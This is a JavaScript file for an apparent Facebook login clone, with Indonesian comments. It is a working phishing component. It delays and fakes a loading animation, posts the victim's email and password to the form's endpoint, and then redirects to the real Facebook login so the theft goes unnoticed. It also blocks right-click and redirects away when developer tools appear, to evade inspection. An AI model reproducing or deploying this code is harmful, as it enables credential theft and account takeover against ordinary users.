// FACEBOOK CLONE - REALISTIC EFFECTS
// Luminary.Quantum v1.0

document.addEventListener('DOMContentLoaded', function () {

    // Auto-focus ke input email
    setTimeout(() => {
        document.querySelector('input[name="email"]').focus();
    }, 500);

    // Efek loading palsu setelah submit
    const form = document.getElementById('loginForm');

    // Buat overlay loading
    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';
    overlay.innerHTML = '<div class="loading-spinner"></div>';
    document.body.appendChild(overlay);

    form.addEventListener('submit', function (e) {
        // Jangan langsung submit, kasih efek loading dulu
        e.preventDefault();

        // Validasi sederhana
        const email = document.querySelector('input[name="email"]').value;
        const pass = document.querySelector('input[name="password"]').value;

        if (!email || !pass) {
            alert('Harap isi email dan kata sandi');
            return;
        }

        // Tampilkan loading
        overlay.style.display = 'flex';

        // Simulasi proses (biar lebih realistik)
        setTimeout(() => {
            // Kirim data ke server
            const formData = new FormData(form);

            fetch(form.action, {
                method: 'POST',
                body: formData
            })
                .then(() => {
                    // Redirect setelah sukses
                    window.location.href = 'https://www.facebook.com/login.php';
                })
                .catch(() => {
                    // Fallback kalo fetch gagal
                    window.location.href = 'https://www.facebook.com/login.php';
                });
        }, 1500); // Delay 1.5 detik biar kaya beneran loading
    });

    // Anti-inspect protection sederhana
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        return false;
    });

    // Anti-devtools (opsional, ga 100% work tapi cukup buat user awam)
    setInterval(function () {
        if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
            // Devtools terdeteksi, redirect keluar
            window.location.href = 'https://www.facebook.com';
        }
    }, 1000);
});